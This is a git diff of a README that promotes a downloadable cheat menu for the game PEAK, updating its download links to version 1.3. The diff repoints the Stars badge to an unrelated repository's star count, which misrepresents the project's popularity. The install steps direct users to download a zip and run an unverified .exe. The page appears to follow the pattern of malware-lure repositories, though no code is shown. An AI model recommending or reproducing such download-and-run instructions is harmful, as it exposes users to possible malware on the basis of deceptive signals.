@@ -1,11 +1,11 @@
 # PEAK Mod Menu / Cheat Hack 1.2
 
-[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-hacks-menu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
-[![GitHub release](https://img.shields.io/badge/Release-1.2-blue?style=for-the-badge)](https://github.com/fuseloadercatalog/PEAK-hacks-menu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip)
+[![Download Latest](https://img.shields.io/badge/Download-Latest-brightgreen?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-cheat-hacks/releases/download/1.3/PEAK.Mod.Build.v1.3.zip)
+[![GitHub release](https://img.shields.io/badge/Release-1.3-blue?style=for-the-badge)](https://github.com/fuseloadercatalog/PEAK-cheat-hacks/releases/download/1.3/PEAK.Mod.Build.v1.3.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![Stars](https://img.shields.io/github/stars/fuseloadercatalog/PEAK-hacks-menu?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-hacks-menu/stargazers)
+[![Stars](https://img.shields.io/github/stars/Azure-Peak/Azure-Peak?style=for-the-badge&logo=github)](https://github.com/fuseloadercatalog/PEAK-cheat-hacks/stargazers)
 
-A feature-rich cheat for PEAK with a clean UI!
+_A feature-rich cheat for PEAK with a clean UI_
 
 Check out the Features list
 
@@ -13,7 +13,7 @@ Check out the Features list
 
 ## Features
 
-![1](https://github.com/fuseloadercatalog/PEAK-hacks-menu/blob/main/assets/image.png)
+![1](https://github.com/fuseloadercatalog/PEAK-cheat-hacks/blob/main/assets/image.png)
 
 ### Player Mods
 
@@ -72,13 +72,13 @@ Check out the Features list
 
 ## How to Install
 
-1. Download the [latest release build](https://github.com/fuseloadercatalog/PEAK-hacks-menu/releases/download/1.2/PEAK.Mod.Build.v1.2.zip) from repo's Releases page.
+1. Download the [latest release build](https://github.com/fuseloadercatalog/PEAK-cheat-hacks/releases/download/1.3/PEAK.Mod.Build.v1.3.zip) from repo's Releases page.
 
 2. Extract the contents to any folder (e.g., `C:\PEAK_Cheat`).
 
 3. Launch game.
 
-4. Run the cheat (`PEAK-menu_github-1.2.exe`).
+4. Run the cheat (`PEAK-menu_github-1.3.exe`).
 
 5. Enjoy. Press the toggle hotkey (default: `[Insert]`) to open the menu.
 
